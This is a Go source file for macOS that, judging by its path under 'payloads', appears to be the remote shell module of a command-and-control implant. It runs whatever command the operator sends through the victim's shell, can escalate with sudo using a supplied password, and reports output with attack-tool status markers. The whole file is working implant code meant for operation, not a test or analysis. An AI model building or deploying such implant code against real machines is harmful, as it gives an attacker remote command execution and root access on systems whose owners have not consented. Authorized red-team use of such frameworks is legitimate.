// server/docker/payloads/Darwin/action_shell_darwin.go

//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

type ShellCommand struct{}

func (c *ShellCommand) Name() string {
	return "shell"
}

// getUnixShell determines the appropriate shell to use on Unix-like systems
func getUnixShell() string {
	// Try to get the user's default shell from SHELL environment variable
	if shell := os.Getenv("SHELL"); shell != "" {
		// Verify the shell exists and is executable
		if _, err := os.Stat(shell); err == nil {
			return shell
		}
	}

	// Fallback chain: try common shells in order of preference
	shells := []string{
		"/bin/bash", // Most common on Linux
		"/bin/zsh",  // Default on modern macOS
		"/bin/sh",   // POSIX standard, should always exist
		"/usr/bin/bash",
		"/usr/bin/zsh",
		"/usr/bin/sh",
	}

	for _, shell := range shells {
		if _, err := os.Stat(shell); err == nil {
			return shell
		}
	}

	// Last resort fallback - this should never happen on a valid Unix system
	return "sh"
}
func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) == 0 {
		return CommandResult{
			Output: `Error: No command specified
Usage: 
  shell [--timeout <seconds>] <command> [arguments...]
  shell --sudo <password> [--timeout <seconds>] <command> [arguments...]

Examples:
  shell whoami
  shell --timeout 5 ping 8.8.8.8
  shell --sudo mypass apt update
  shell --sudo mypass --timeout 60 apt upgrade`,
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Default timeout
	timeout := 30 * time.Second
	commandArgs := args
	useSudo := false
	sudoPassword := ""

	// Parse flags
	i := 0
	for i < len(args) {
		switch args[i] {
		case "--sudo":
			if i+1 >= len(args) {
				return CommandResult{
					Output:      "Error: --sudo requires a password",
					ExitCode:    1,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}
			useSudo = true
			sudoPassword = args[i+1]
			i += 2

		case "--timeout":
			if i+1 >= len(args) {
				return CommandResult{
					Output:      "Error: --timeout requires a value",
					ExitCode:    1,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}

			timeoutSeconds, err := strconv.Atoi(args[i+1])
			if err != nil || timeoutSeconds <= 0 {
				return CommandResult{
					Output:      fmt.Sprintf("Error: Invalid timeout value '%s'", args[i+1]),
					ExitCode:    1,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}
			timeout = time.Duration(timeoutSeconds) * time.Second
			i += 2

		default:
			commandArgs = args[i:]
			i = len(args) // Break the loop
		}
	}

	if len(commandArgs) == 0 {
		return CommandResult{
			Output:      "Error: No command specified after flags",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Join command arguments
	commandStr := strings.Join(commandArgs, " ")

	// Get working directory
	ctx.mu.RLock()
	workingDir := ctx.WorkingDir
	ctx.mu.RUnlock()

	// Build output header
	var output strings.Builder
	output.WriteString(fmt.Sprintf("[*] Executing: %s\n", commandStr))
	output.WriteString(fmt.Sprintf("[*] Working Directory: %s\n", workingDir))
	output.WriteString(fmt.Sprintf("[*] Timeout: %v\n", timeout))

	var commandOutput string
	var exitCode int
	var cmdErr error

	startTime := time.Now()

	if useSudo {
		output.WriteString("[*] Mode: Sudo (PTY-based)\n")
		output.WriteString(strings.Repeat("-", 50) + "\n")

		// Use PTY helper for sudo
		ptyHelper := &PTYHelper{timeout: timeout}
		commandOutput, exitCode, cmdErr = ptyHelper.ExecuteWithSudo(sudoPassword, commandStr, workingDir)

	} else {
		// Regular shell execution (existing code)
		shell := getUnixShell()
		output.WriteString(fmt.Sprintf("[*] Shell: %s\n", shell))
		output.WriteString(strings.Repeat("-", 50) + "\n")

		execContext, cancel := context.WithTimeout(context.Background(), timeout)
		defer cancel()

		cmd := exec.CommandContext(execContext, shell, "-c", commandStr)
		cmd.Dir = workingDir

		var stdout, stderr bytes.Buffer
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr

		cmdErr = cmd.Run()

		commandOutput = stdout.String()
		if stderr.Len() > 0 {
			if commandOutput != "" {
				commandOutput += "\n"
			}
			commandOutput += "[STDERR]\n" + stderr.String()
		}

		if cmdErr != nil {
			if execContext.Err() == context.DeadlineExceeded {
				exitCode = 124
				cmdErr = fmt.Errorf("command timed out")
			} else if exitErr, ok := cmdErr.(*exec.ExitError); ok {
				exitCode = exitErr.ExitCode()
			} else {
				exitCode = 1
			}
		}
	}

	// Add command output
	output.WriteString(commandOutput)

	// Add execution time and status
	executionTime := time.Since(startTime)
	output.WriteString(fmt.Sprintf("\n%s\n", strings.Repeat("-", 50)))
	output.WriteString(fmt.Sprintf("[*] Execution time: %v\n", executionTime.Round(time.Millisecond)))

	if cmdErr != nil {
		output.WriteString(fmt.Sprintf("[!] Command failed: %v (exit code: %d)\n", cmdErr, exitCode))
	} else {
		output.WriteString("[*] Command completed successfully\n")
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    exitCode,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
